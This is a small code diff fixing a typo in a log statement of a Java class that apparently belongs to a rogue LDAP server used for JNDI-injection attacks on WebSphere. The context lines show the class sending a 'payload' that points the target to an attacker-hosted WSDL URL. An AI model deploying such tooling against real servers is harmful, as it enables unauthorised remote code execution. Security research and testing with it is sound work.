@@ -39,7 +39,7 @@ public class WebSphere1 implements LdapController {
             wsdl = "http://" + Config.hostname + ":" + Config.httpPort + Config.wsdl; //get from config if not specified
         
         Timestamp timestamp = new Timestamp(System.currentTimeMillis());
-        System.out.println(timestmp + "Sending Websphere1 payload pointing to " + wsdl);
+        System.out.println(timestamp + "Sending Websphere1 payload pointing to " + wsdl);
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
